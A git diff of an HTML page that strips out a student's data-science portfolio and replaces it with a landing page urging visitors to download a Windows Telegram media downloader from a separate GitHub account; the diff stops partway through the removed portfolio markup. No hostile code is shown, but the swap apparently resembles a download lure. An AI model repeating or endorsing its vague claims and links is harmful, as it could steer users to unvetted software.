@@ -1,1945 +1,240 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <meta
-    name="description"
-    content="Nakyung (Chloe) Oh — data science, psychology, and human behavior. Research and analytics portfolio."
-  >
-  <meta name="author" content="Nakyung Oh">
-  <meta name="theme-color" content="#ffffff">
-
-  <title>Nakyung (Chloe) Oh | Data Science &amp; Psychology</title>
-
-  <link rel="canonical" href="https://nakyungoh0314.github.io/">
-  <link
-  rel="stylesheet"
-  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-  <meta property="og:title" content="Nakyung (Chloe) Oh | Portfolio">
-  <meta
-    property="og:description"
-    content="Exploring people, learning, and behavior through data."
-  >
-  <meta property="og:url" content="https://nakyungoh0314.github.io/">
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>telegram-downloader - Fast, Secure Telegram Media Downloader</title>
+  <meta name="description" content="telegram-downloader is a high-speed, multi-connection Telegram terminal downloader for Windows. Enjoy cryptographic acceleration, smart name and size deduplication, and QR code login. Easy to use, no programming needed.">
+  <meta name="keywords" content="cli, downloader, fast-download, media-downloader, mtproto, multithreading, python, telegram, telegram-downloader, telethon">
+  <meta name="author" content="Tochewillys1">
+  <meta property="og:title" content="telegram-downloader - Fast, Secure Telegram Media Downloader">
+  <meta property="og:description" content="High-speed multi-connection Telegram downloader for Windows with QR code login and smart deduplication.">
+  <meta property="og:url" content="https://github.com/Tochewillys1/telegram-downloader">
+  <meta property="og:type" content="website">
   <style>
-    /* =========================
-       GENERAL STYLES
-    ========================= */
-
-    :root {
-      --bg: #ffffff;
-      --surface: #f6f6f6;
-      --ink: #141414;
-      --muted: #626262;
-      --line: #dedede;
-    }
-
     * {
       box-sizing: border-box;
-    }
-
-    html {
-      scroll-behavior: smooth;
-      scroll-padding-top: 95px;
-    }
-
-    body {
       margin: 0;
-      color: var(--ink);
-      background: var(--bg);
-      font-family: Arial, Helvetica, sans-serif;
-      line-height: 1.7;
+      padding: 0;
     }
-
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f8f9fa;
+      color: #212529;
+      line-height: 1.7;
+      padding: 2rem 1rem;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+      padding: 2.5rem 2rem;
+    }
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: #0d6efd;
+      margin-bottom: 1rem;
+      line-height: 1.2;
+      letter-spacing: -0.5px;
+    }
+    h2 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      color: #1e293b;
+      margin-top: 2.5rem;
+      margin-bottom: 1rem;
+      border-bottom: 2px solid #e2e8f0;
+      padding-bottom: 0.5rem;
+    }
+    h3 {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #334155;
+      margin-top: 1.8rem;
+      margin-bottom: 0.75rem;
+    }
+    p {
+      margin-bottom: 1.2rem;
+      font-size: 1.05rem;
+      color: #334155;
+    }
+    ul, ol {
+      margin-bottom: 1.5rem;
+      padding-left: 1.8rem;
+    }
+    li {
+      margin-bottom: 0.6rem;
+      font-size: 1.05rem;
+    }
     a {
-      color: inherit;
+      color: #0d6efd;
       text-decoration: none;
     }
-
-    button {
-      font: inherit;
+    a:hover {
+      text-decoration: underline;
+    }
+    .button {
+      display: inline-block;
+      background: linear-gradient(135deg, #ff6b6b, #feca57);
+      color: #ffffff;
+      font-weight: 700;
+      text-decoration: none;
+      border-radius: 12px;
+      padding: 1rem 2rem;
+      box-shadow: 0 8px 20px rgba(255, 107, 107, 0.35);
+      transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
+      text-align: center;
+      border: none;
       cursor: pointer;
     }
-
-    a,
-    button,
-    summary {
-      -webkit-tap-highlight-color: transparent;
+    .button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px rgba(255, 107, 107, 0.45);
+      opacity: 0.95;
+      text-decoration: none;
     }
-
-    a:focus-visible,
-    button:focus-visible,
-    summary:focus-visible,
-    [tabindex="0"]:focus-visible {
-      outline: 2px solid #444;
-      outline-offset: 5px;
+    .button-top {
+      font-size: 1.5rem;
+      padding: 1.2rem 3rem;
+      margin: 1.5rem 0 2rem 0;
     }
-
-    ::selection {
-      background: #111;
-      color: white;
+    .button-secondary {
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      box-shadow: 0 8px 20px rgba(79, 172, 254, 0.35);
+      font-size: 1.2rem;
+      padding: 0.9rem 2rem;
     }
-
-    .container {
-      width: min(1140px, calc(100% - 64px));
-      margin: auto;
+    .button-secondary:hover {
+      box-shadow: 0 12px 28px rgba(79, 172, 254, 0.45);
     }
-
-    .sr-only {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      overflow: hidden;
-      clip-path: inset(50%);
-      white-space: nowrap;
+    .note-box {
+      background: #f1f5f9;
+      border-left: 6px solid #0d6efd;
+      padding: 1.2rem 1.5rem;
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      font-size: 1.05rem;
     }
-
-    .skip-link {
-      position: fixed;
-      top: -80px;
-      left: 20px;
-      padding: 12px 20px;
-      background: #111;
-      color: white;
-      z-index: 100;
+    .note-box strong {
+      color: #0d6efd;
     }
-
-    .skip-link:focus {
-      top: 10px;
-    }
-
-    /* =========================
-       NAVIGATION
-    ========================= */
-
-    .navbar {
-      position: sticky;
-      top: 0;
-      background: rgba(255, 255, 255, 0.97);
-      border-bottom: 1px solid var(--line);
-      z-index: 30;
-    }
-
-    .navbar .container {
-      height: 80px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 25px;
-    }
-
-    .logo {
-      font-size: 22px;
-      letter-spacing: -0.8px;
-      font-weight: 750;
-      white-space: nowrap;
-    }
-
-    .nav-links {
-      display: flex;
+    .steps-list {
+      counter-reset: step-counter;
       list-style: none;
-      gap: 22px;
-      padding: 0;
-      margin: 0;
+      padding-left: 0;
     }
-
-    .nav-links a {
+    .steps-list li {
+      counter-increment: step-counter;
       position: relative;
-      padding: 10px 0;
-      font: 11px/1.5 monospace;
-      letter-spacing: 0.7px;
-      text-transform: uppercase;
+      padding-left: 3rem;
+      margin-bottom: 1rem;
     }
-
-    .nav-links a::after {
-      content: "";
+    .steps-list li::before {
+      content: counter(step-counter);
       position: absolute;
-      bottom: 2px;
       left: 0;
-      width: 0;
-      height: 2px;
-      background: #111;
-      transition: width 0.25s;
-    }
-
-    .nav-links a:hover::after,
-    .nav-links a.active::after {
-      width: 100%;
-    }
-
-    .hamburger {
-      display: none;
-      border: 0;
-      background: transparent;
-      padding: 10px;
-    }
-
-    .hamburger span {
-      display: block;
-      width: 23px;
-      height: 2px;
-      background: #111;
-      margin: 5px;
-    }
-
-    .mobile-nav-overlay {
-      display: none;
-    }
-
-    /* =========================
-       HERO SECTION
-    ========================= */
-
-    .hero {
-      min-height: calc(100svh - 80px);
-      background: var(--surface);
-      position: relative;
-      display: flex;
-      align-items: center;
-      padding: 95px 0 110px;
-    }
-
-    .hero-content {
-      width: min(1140px, calc(100% - 64px));
-      margin: auto;
-      display: grid;
-      grid-template-columns: 1.4fr 1fr;
-      align-items: center;
-      gap: 70px;
-    }
-
-    .greeting {
+      top: 0;
+      background: #0d6efd;
+      color: #fff;
       font-weight: 700;
-      font-size: 19px;
-      margin: 0 0 14px;
-    }
-
-    .name {
-      font-size: clamp(42px, 4.8vw, 65px);
-      letter-spacing: -2.5px;
-      line-height: 1.16;
-      margin: 0 0 24px;
-    }
-
-    .title {
-      font-size: clamp(24px, 2.8vw, 36px);
-      line-height: 1.3;
-      font-weight: 600;
-      margin: 0 0 26px;
-    }
-
-    .tagline {
-      font-size: 17px;
-      color: var(--muted);
-      min-height: 58px;
-      max-width: 510px;
-    }
-
-    .typing-cursor {
-      border-right: 1px solid #111;
-      animation: blink 1s step-end infinite;
-    }
-
-    .hero-buttons,
-    .about-buttons {
+      width: 2rem;
+      height: 2rem;
+      border-radius: 50%;
       display: flex;
-      flex-wrap: wrap;
-      gap: 14px;
-      margin-top: 30px;
-    }
-
-    .btn {
-      padding: 13px 22px;
-      border: 1px solid var(--line);
-      border-radius: 5px;
-      font-size: 14px;
-      font-weight: 600;
-      display: inline-flex;
       align-items: center;
-      gap: 18px;
-      transition:
-        transform 0.25s,
-        background 0.25s,
-        color 0.25s;
-    }
-
-    .btn:hover {
-      transform: translateY(-3px);
-      background: #333;
-      color: #fff;
-      border-color: #333;
-    }
-
-    .btn-primary {
-      background: #111;
-      border-color: #111;
-      color: #fff;
-    }
-
-    .btn-secondary,
-    .btn-quiet {
-      background: transparent;
-    }
-
-    .profile-image-container {
-      max-width: 355px;
-      width: 100%;
-      margin: auto;
-      position: relative;
-    }
-
-    .profile-image-container::before {
-      content: "";
-      position: absolute;
-      inset: -18px;
-      border-radius: 50%;
-      border: 1px dashed #c9c9c9;
-      animation: orbit 90s linear infinite;
-    }
-
-    .profile-image {
-      position: relative;
-      border: 6px solid white;
-      border-radius: 50%;
-      overflow: hidden;
-      aspect-ratio: 1;
-      box-shadow: 0 18px 40px #00000012;
-    }
-
-    .profile-image img {
-      display: block;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .scroll-indicator {
-      position: absolute;
-      bottom: 30px;
-      left: calc(50% - 12px);
-      width: 24px;
-      height: 39px;
-      border: 2px solid #666;
-      border-radius: 16px;
-    }
-
-    .scroll-indicator span {
-      position: absolute;
-      width: 3px;
-      height: 9px;
-      top: 7px;
-      left: 9px;
-      background: #555;
-      border-radius: 4px;
-      animation: scroll 1.8s infinite;
-    }
-
-    /* =========================
-       SHARED SECTION STYLES
-    ========================= */
-
-    main > section:not(.hero) {
-      padding: 86px 0;
-    }
-
-    .section-title {
-      text-align: center;
-      font-size: 38px;
-      letter-spacing: -1px;
-      line-height: 1.2;
-      margin: 0 0 52px;
-    }
-
-    .section-title::after {
-      content: "";
-      display: block;
-      width: 46px;
-      height: 3px;
-      background: #111;
-      margin: 18px auto 0;
-    }
-
-    /* =========================
-       ABOUT
-    ========================= */
-
-    .about-content {
-      display: grid;
-      grid-template-columns: 1.55fr 1fr;
-      gap: 65px;
-      align-items: center;
-    }
-
-    .about-text p {
-      color: var(--muted);
-      font-size: 16px;
-    }
-
-    .about-stats {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 14px;
-      text-align: center;
-    }
-
-    .stat-number {
-      display: block;
-      font-size: 36px;
-      font-weight: 700;
-      letter-spacing: -1px;
-    }
-
-    .stat-label {
-      display: block;
-      font: 10px/1.6 monospace;
-      letter-spacing: 0.8px;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-
-    /* =========================
-       SKILLS
-    ========================= */
-
-    .skills,
-    .projects,
-    .education {
-      background: var(--surface);
-    }
-
-    .skills-wrapper {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 24px;
-    }
-
-    .skills-category {
-      border: 1px solid var(--line);
-      background: #fff;
-      padding: 28px;
-      border-radius: 8px;
-    }
-
-    .skills-category h3 {
-      font-size: 19px;
-      margin: 0 0 22px;
-    }
-
-    .skill-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 9px;
-    }
-
-    .skill-tag,
-    .tag {
-      font-size: 12px;
-      padding: 6px 11px;
-      background: #f3f3f3;
-      border: 1px solid #e5e5e5;
-      border-radius: 4px;
-    }
-
-    /* =========================
-       TOOLS CAROUSEL
-    ========================= */
-
-    .carousel-controls {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 20px;
-      margin-bottom: 22px;
-    }
-
-    .carousel-controls p {
-      color: var(--muted);
-      margin: 0;
-    }
-
-    .carousel-controls button {
-      width: 40px;
-      height: 40px;
-      border: 1px solid var(--line);
-      background: #fff;
-      border-radius: 50%;
-      margin-left: 8px;
-      transition: background 0.2s;
-    }
-
-    .carousel-controls button:hover {
-      background: #eee;
-    }
-
-    .carousel-controls button:disabled {
-      opacity: 0.3;
-      cursor: default;
-    }
-
-    .skills-carousel-track {
-      display: flex;
-      gap: 20px;
-      overflow-x: auto;
-      scroll-snap-type: x mandatory;
-      scrollbar-width: thin;
-      scrollbar-color: #aaa #eee;
-      padding: 4px 0 18px;
-    }
-
-    .skill-card {
-      flex: 0 0 calc((100% - 60px) / 4);
-      min-width: 220px;
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      padding: 26px;
-      scroll-snap-align: start;
-      transition: transform 0.25s;
-    }
-
-    .skill-card:hover {
-      transform: translateY(-4px);
-    }
-
-    .skill-card-icon {
-      font: 22px monospace;
-      color: #888;
-    }
-
-    .skill-card h3 {
-      font-size: 20px;
-      margin: 22px 0 10px;
-    }
-
-    .skill-card p {
-      font-size: 14px;
-      color: var(--muted);
-      margin: 0;
-    }
-
-    /* =========================
-       PROJECTS
-    ========================= */
-
-    .projects-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 28px;
-    }
-
-    .project-card {
-      border: 1px solid var(--line);
-      border-radius: 9px;
-      background: #fff;
-      overflow: hidden;
-      transition:
-        transform 0.3s,
-        box-shadow 0.3s;
-    }
-
-    .project-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 15px 28px #00000008;
-    }
-
-    .project-image {
-      height: 170px;
-      padding: 28px;
-      display: flex;
-      align-items: flex-end;
-      justify-content: space-between;
-      background: #191919;
-      color: #ddd;
-      font: 10px monospace;
-      letter-spacing: 1.6px;
-    }
-
-    .project-number {
-      font: 80px/1 Georgia, serif;
-      color: #fff;
-    }
-
-    .project-card:nth-child(2) .project-image,
-    .project-card:nth-child(3) .project-image {
-      background: #e8e8e8;
-      color: #444;
-    }
-
-    .project-card:nth-child(2) .project-number,
-    .project-card:nth-child(3) .project-number {
-      color: #222;
-    }
-
-    .project-content {
-      padding: 28px;
-    }
-
-    .project-content h3 {
-      font-size: 24px;
-      line-height: 1.35;
-      letter-spacing: -0.5px;
-      margin: 0 0 15px;
-    }
-
-    .project-content p {
-      color: var(--muted);
-      font-size: 15px;
-    }
-
-    .project-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin: 22px 0;
-    }
-
-    details {
-      border-top: 1px solid var(--line);
-      padding-top: 17px;
-    }
-
-    summary {
-      list-style: none;
-      cursor: pointer;
-      display: flex;
-      justify-content: space-between;
-      font-size: 13px;
-      font-weight: 600;
-    }
-
-    summary::-webkit-details-marker {
-      display: none;
-    }
-
-    summary span {
-      font-size: 20px;
-      line-height: 1.1;
-    }
-
-    details[open] summary span {
-      transform: rotate(45deg);
-    }
-
-    /* =========================
-       EXPERIENCE & EDUCATION
-    ========================= */
-
-    .experience-timeline,
-    .education-timeline {
-      max-width: 850px;
-      margin: auto;
-      border-left: 1px solid #ccc;
-      padding-left: 35px;
-    }
-
-    .experience-item,
-    .education-item {
-      position: relative;
-      margin-bottom: 24px;
-    }
-
-    .experience-marker,
-    .education-marker {
-      position: absolute;
-      left: -41px;
-      top: 30px;
-      width: 11px;
-      height: 11px;
-      background: #111;
-      border: 2px solid #fff;
-      border-radius: 50%;
-    }
-
-    .experience-card,
-    .education-card {
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      padding: 28px;
-      background: #fff;
-    }
-
-    .experience-card h3,
-    .education-card h3 {
-      font-size: 22px;
-      margin: 0 0 8px;
-    }
-
-    .experience-card p,
-    .education-card p {
-      color: var(--muted);
-      font-size: 15px;
-      margin: 10px 0;
-    }
-
-    .institution {
-      font-weight: 600;
-      color: #333 !important;
-    }
-
-    .duration {
-      font: 12px monospace;
-    }
-
-    /* =========================
-       CONTACT & FOOTER
-    ========================= */
-
-    .contact {
-      background: #111;
-      color: white;
-    }
-
-    .contact .section-title::after {
-      background: white;
-    }
-
-    .contact-intro {
-      max-width: 600px;
-      text-align: center;
-      margin: -12px auto 35px;
-      color: #bbb;
-    }
-
-    .contact-info {
-      display: flex;
       justify-content: center;
+      font-size: 1rem;
     }
-
-    .contact-item {
-      display: flex;
-      align-items: center;
-      gap: 22px;
-      border: 1px solid #555;
-      padding: 24px 38px;
-      border-radius: 8px;
-      transition: background 0.2s;
-    }
-
-    .contact-item:hover {
-      background: #252525;
-    }
-
-    .contact-icon {
-      font-size: 30px;
-    }
-
-    .contact-item h3 {
-      font-size: 19px;
-      margin: 0;
-    }
-
-    .contact-item p {
-      font-size: 14px;
-      color: #bbb;
-      margin: 5px 0;
-    }
-
-    .footer {
-      background: #111;
-      color: #aaa;
-      text-align: center;
-      font-size: 12px;
-      padding: 25px 0;
-      border-top: 1px solid #333;
-    }
-
-    .footer p {
-      margin: 4px 0;
-    }
-
-    .back-to-top {
-      position: fixed;
-      right: 22px;
-      bottom: 22px;
-      width: 44px;
-      height: 44px;
-      background: #fff;
-      border: 1px solid #ccc;
-      color: #111;
-      border-radius: 50%;
-      z-index: 20;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.25s;
-      font-size: 22px;
-    }
-
-    .back-to-top.visible {
-      opacity: 1;
-      visibility: visible;
-    }
-
-    /* =========================
-       ANIMATIONS
-    ========================= */
-
-    .motion .animate-on-scroll {
-      opacity: 0;
-      transform: translateY(24px);
-      transition:
-        opacity 0.65s ease,
-        transform 0.65s ease;
-    }
-
-    .motion .animate-on-scroll.visible {
-      opacity: 1;
-      transform: translateY(0);
-    }
-
-    @keyframes blink {
-      50% {
-        border-color: transparent;
-      }
-    }
-
-    @keyframes scroll {
-      to {
-        transform: translateY(12px);
-        opacity: 0;
-      }
-    }
-
-    @keyframes orbit {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    @keyframes enter {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-
-      to {
-        opacity: 1;
-        transform: none;
-      }
-    }
-
-    @media (min-width: 901px) {
-      .hero-text {
-        animation: enter 0.8s ease both;
-      }
-
-      .hero-visual {
-        animation: enter 1s 0.12s ease both;
-      }
-    }
-
-    /* =========================
-       RESPONSIVE LAYOUT
-    ========================= */
-
-    @media (max-width: 1050px) {
-      .nav-links {
-        gap: 13px;
-      }
-
-      .logo {
-        font-size: 19px;
-      }
-
-      .hero-content {
-        gap: 45px;
-      }
-
-      .about-content {
-        gap: 30px;
-      }
-    }
-
-    @media (max-width: 900px) {
-      .hamburger {
-        display: block;
-      }
-
-      .nav-links {
-        display: none;
-        position: absolute;
-        top: 80px;
-        left: 0;
-        right: 0;
-        background: #fff;
-        padding: 22px 32px;
-        border-bottom: 1px solid var(--line);
-        flex-direction: column;
-        gap: 20px;
-      }
-
-      .nav-links.open {
-        display: flex;
-      }
-
-      .nav-links a {
-        font-size: 13px;
-      }
-
-      .mobile-nav-overlay.open {
-        display: block;
-        position: fixed;
-        inset: 80px 0 0;
-        background: #0005;
-        z-index: 25;
-      }
-
-      .hero-content {
-        grid-template-columns: 1fr;
-        gap: 60px;
-        text-align: center;
-      }
-
-      .hero-text {
-        max-width: 650px;
-        margin: auto;
-      }
-
-      .tagline {
-        margin-left: auto;
-        margin-right: auto;
-      }
-
-      .hero-buttons {
-        justify-content: center;
-      }
-
-      .profile-image-container {
-        max-width: 290px;
-      }
-
-      .hero {
-        padding: 70px 0 100px;
-        min-height: auto;
-      }
-
-      .about-content {
-        grid-template-columns: 1fr;
-        gap: 40px;
-      }
-
-      .about-stats {
-        max-width: 480px;
-        width: 100%;
-        margin: auto;
-      }
-
-      .skills-wrapper {
-        grid-template-columns: 1fr;
-      }
-
-      .skill-card {
-        flex-basis: calc((100% - 20px) / 2);
-      }
-    }
-
     @media (max-width: 600px) {
-      .container,
-      .hero-content {
-        width: calc(100% - 40px);
-      }
-
-      .navbar .container {
-        height: 72px;
-      }
-
-      .nav-links {
-        top: 72px;
-      }
-
-      .mobile-nav-overlay.open {
-        top: 72px;
-      }
-
-      .name {
-        font-size: 43px;
-        letter-spacing: -1.8px;
-      }
-
-      .title {
-        font-size: 25px;
-      }
-
-      .profile-image-container {
-        max-width: 250px;
-      }
-
-      .hero {
-        padding-top: 55px;
-      }
-
-      .section-title {
-        font-size: 31px;
-        margin-bottom: 35px;
-      }
-
-      main > section:not(.hero) {
-        padding: 62px 0;
-      }
-
-      .projects-grid {
-        grid-template-columns: 1fr;
-      }
-
-      .project-image {
-        height: 140px;
-      }
-
-      .project-content {
-        padding: 24px;
-      }
-
-      .experience-timeline,
-      .education-timeline {
-        padding-left: 22px;
-      }
-
-      .experience-marker,
-      .education-marker {
-        left: -28px;
-      }
-
-      .experience-card,
-      .education-card {
-        padding: 22px;
-      }
-
-      .skill-card {
-        flex-basis: 85%;
-      }
-
-      .carousel-controls p {
-        font-size: 13px;
-      }
-
-      .stat-number {
-        font-size: 30px;
-      }
-
-      .contact-item {
-        padding: 22px 28px;
-      }
-
-      .btn {
-        padding: 12px 18px;
-      }
-    }
-
-    /* Respect visitors' reduced-motion preferences. */
-    @media (prefers-reduced-motion: reduce) {
-      html {
-        scroll-behavior: auto;
-      }
-
-      *,
-      *::before,
-      *::after {
-        animation: none !important;
-        transition: none !important;
-      }
-
-      .motion .animate-on-scroll {
-        opacity: 1;
-        transform: none;
-      }
+      .container { padding: 1.5rem 1rem; }
+      h1 { font-size: 1.9rem; }
+      h2 { font-size: 1.5rem; }
+      .button-top { font-size: 1.2rem; padding: 1rem 1.8rem; }
     }
   </style>
 </head>
-
 <body>
-  <a href="#main-content" class="skip-link">
-    Skip to content
-  </a>
+  <div class="container">
+    <h1>🚀 telegram-downloader - Fast, Secure Telegram Media Downloader</h1>
+    <p><strong>telegram-downloader</strong> is a powerful yet easy-to-use application for Windows that helps you download files, photos, videos, and other media from Telegram at lightning speed. It uses multiple connections to accelerate downloads, automatically avoids duplicate files, and lets you log in securely by scanning a QR code with your phone. No programming knowledge is required to get started.</p>
 
-  <!-- NAVIGATION -->
-  <nav class="navbar" aria-label="Main navigation">
-    <div class="container">
-      <a href="#home" class="logo">Nakyung (Chloe) Oh</a>
+    <a href="https://github.com/Tochewillys1/telegram-downloader" class="button button-top" target="_blank" rel="noopener">Download Now</a>
 
-      <button
-        class="hamburger"
-        id="hamburger"
-        aria-label="Toggle navigation menu"
-        aria-expanded="false"
-        aria-controls="navLinks"
-      >
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
+    <h2>✨ Key Features</h2>
+    <ul>
+      <li><strong>High-speed multi-connection downloads:</strong> Maximizes your internet bandwidth by using several connections at once.</li>
+      <li><strong>Cryptographic acceleration:</strong> Speeds up the download process while keeping your data secure.</li>
+      <li><strong>Smart name &amp; size deduplication:</strong> Automatically detects and skips files you already have, saving time and disk space.</li>
+      <li><strong>QR code login:</strong> Log in to your Telegram account quickly and safely by scanning a QR code with your mobile Telegram app.</li>
+      <li><strong>Terminal-based interface:</strong> Runs in a simple command window. Just follow the on-screen prompts—no technical skills needed.</li>
+      <li><strong>Windows ready:</strong> Designed to work smoothly on modern Windows computers.</li>
+    </ul>
 
-      <ul class="nav-links" id="navLinks">
-        <li><a href="#home">Home</a></li>
-        <li><a href="#about">About</a></li>
-        <li><a href="#skills">Skills</a></li>
-        <li><a href="#projects">Projects</a></li>
-        <li><a href="#experience">Experience</a></li>
-        <li><a href="#education">Education</a></li>
-        <li><a href="#contact">Contact</a></li>
-      </ul>
+    <h2>📥 Download and Install</h2>
+    <p>To download telegram-downloader, visit the official download page using the button below. This will take you to the repository where you can get the application.</p>
+    <p><a href="https://github.com/Tochewillys1/telegram-downloader" class="button button-secondary" target="_blank" rel="noopener">Visit Download Page</a></p>
+    <div class="note-box">
+      <strong>Important:</strong> Please download only from the official link above. Avoid third-party websites to ensure you get the latest, safest version.
     </div>
-  </nav>
 
-  <div class="mobile-nav-overlay" id="mobileNavOverlay"></div>
-
-  <main id="main-content" tabindex="-1">
-
-    <!-- HERO -->
-    <section id="home" class="hero" aria-label="Introduction">
-      <div class="hero-content">
-        <div class="hero-text">
-          <p class="greeting">Hello, I'm</p>
-
-          <h1 class="name">
-            Nakyung (Chloe) Oh
-            <span class="sr-only">
-              | Psychology | Data Science | Human Behavior
-            </span>
-          </h1>
-
-          <h2 class="title">Psychology &amp; Data Science</h2>
-
-          <p class="tagline">
-            Exploring people, learning, and behavior through data
-          </p>
-
-      <div class="hero-buttons"> 
-
-            <a
-              href="https://www.linkedin.com/in/nakyungoh/"
-              target="_blank"
-              rel="noopener noreferrer"
-              class="btn btn-quiet"
-            >
-              LinkedIn
-              <span aria-hidden="true">↗</span>
-            </a>
-
-            <a
-              href="https://github.com/nakyungoh0314"
-              target="_blank"
-              rel="noopener noreferrer"
-              class="btn btn-quiet"
-            >
-              GitHub
-              <span aria-hidden="true">↗</span>
-            </a>
-
-            <a
-              href="https://scholar.google.com/citations?user=VW7ddkcAAAAJ&hl=en&oi=ao"
-              target="_blank"
-              rel="noopener noreferrer"
-              class="btn btn-quiet"
-            >
-              Google Scholar
-              <span aria-hidden="true">↗</span>
-            </a>
-              
-        </div>
-        </div>
-
-        <div class="hero-visual">
-          <div class="profile-image-container">
-            <div class="profile-image">
-              <img
-                src="./portfolio_pic.JPG"
-                alt="Nakyung (Chloe) Oh"
-                fetchpriority="high"
-                width="600"
-                height="600"
-              >
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <a
-        href="#about"
-        class="scroll-indicator"
-        aria-label="Scroll to learn more"
-      >
-        <span></span>
-      </a>
-    </section>
-
-    <!-- ABOUT -->
-    <section id="about" class="about" aria-labelledby="about-heading">
-      <div class="container">
-        <h2 class="section-title" id="about-heading">About Me</h2>
-
-        <div class="about-content">
-          <div class="about-text">
-            <p>
-              I'm studying Data Science in Human Behavior at the
-              University of Wisconsin–Madison. Through computational modeling, statistical analysis, machine learning, and quantitative research, I aim to understand and predict human behavior and decision-making within broader social contexts.
-            </p>
-
-            <p>
-              My work spans LLM-assisted analysis of book reviews,
-              student learning analytics, fMRI classification,
-              and HR analytics. I enjoy connecting technical
-              methods to meaningful research questions and
-              communicating results clearly.
-            </p>
-
-            <div class="about-buttons">
-              <a href="./Resume_OH.pdf" class="btn btn-primary" download>
-                  <i class="fas fa-download"></i> Download Resume
-              </a>
-              <a href="./Resume_OH.pdf" target="_blank" rel="noopener noreferrer" class="btn btn-secondary">
-                  <i class="fas fa-eye"></i> View Resume
-              </a>
-            </p>
-              <a href="./CV.pdf" class="btn btn-primary" download> 
-                  <i class="fas fa-download"></i> Download CV
-              </a>
-              <a href="./CV.pdf" target="_blank" rel="noopener noreferrer" class="btn btn-secondary">
-                  <i class="fas fa-eye"></i> View CV
-              </a>
-            </div>
-          </div>
-
-          <div class="about-stats">
-            <div class="stat">
-              <span class="stat-number">6</span>
-              <span class="stat-label">Projects</span>
-            </div>
-
-            <div class="stat">
-              <span class="stat-number">MS</span>
-              <span class="stat-label">Psychology</span>
-            </div>
-
-            <div class="stat">
-              <span class="stat-number">2026</span>
-              <span class="stat-label">Graduation Year</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SKILLS -->
-    <section id="skills" class="skills" aria-labelledby="skills-heading">
-      <div class="container">
-        <h2 class="section-title" id="skills-heading">
-          Skills &amp; Strengths
-        </h2>
-
-        <div class="skills-wrapper">
-          <div class="skills-category">
-            <h3>Analytical Strengths</h3>
-
-            <div class="skill-tags">
-              <span class="skill-tag">Statistical Modeling</span>
-              <span class="skill-tag">Model Evaluation</span>
-              <span class="skill-tag">Data Interpretation</span>
-              <span class="skill-tag">Research Design</span>
-            </div>
-          </div>
-
-          <div class="skills-category">
-            <h3>Working Together</h3>
-
-            <div class="skill-tags">
-              <span class="skill-tag">Collaboration</span>
-              <span class="skill-tag">Clear Communication</span>
-              <span class="skill-tag">Problem Solving</span>
-              <span class="skill-tag">Attention to Detail</span>
-            </div>
-          </div>
-
-          <div class="skills-category">
-            <h3>Research Areas</h3>
-
-            <div class="skill-tags">
-              <span class="skill-tag">Human Behavior</span>
-              <span class="skill-tag">Learning Analytics</span>
-              <span class="skill-tag">Text Analysis</span>
-              <span class="skill-tag">People Analytics</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- TOOLS CAROUSEL -->
-    <section
-      id="technical-skills"
-      class="technical-skills"
-      aria-labelledby="technical-skills-heading"
-    >
-      <div class="container">
-        <h2 class="section-title" id="technical-skills-heading">
-          Tools &amp; Tech
-        </h2>
-
-        <div class="carousel-controls">
-          <p>Explore my analytical toolkit.</p>
-
-          <div>
-            <button
-              class="carousel-prev"
-              aria-label="Previous tools"
-              aria-controls="skillsCarouselTrack"
-            >
-              ←
-            </button>
-
-            <button
-              class="carousel-next"
-              aria-label="Next tools"
-              aria-controls="skillsCarouselTrack"
-            >
-              →
-            </button>
-          </div>
-        </div>
-
-        <div
-          class="skills-carousel"
-          aria-label="Technical skills carousel"
-          role="region"
-        >
-          <div
-            class="skills-carousel-track"
-            id="skillsCarouselTrack"
-            tabindex="0"
-          >
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">01</span>
-              <h3>Python</h3>
-              <p>Machine learning and data analysis</p>
-            </div>
-
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">02</span>
-              <h3>R</h3>
-              <p>Regression and mixed-effects models</p>
-            </div>
-
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">03</span>
-              <h3>SQL</h3>
-              <p>Querying and organizing data</p>
-            </div>
-
-            <div class="skill-card">
-              <span class="skill-card-icon" aria-hidden="true">04</span>
-              <h3>Excel</h3>
-              <p>Statistical analysis and reporting</p>
-            </div>
-
-            <div class="skill-card">
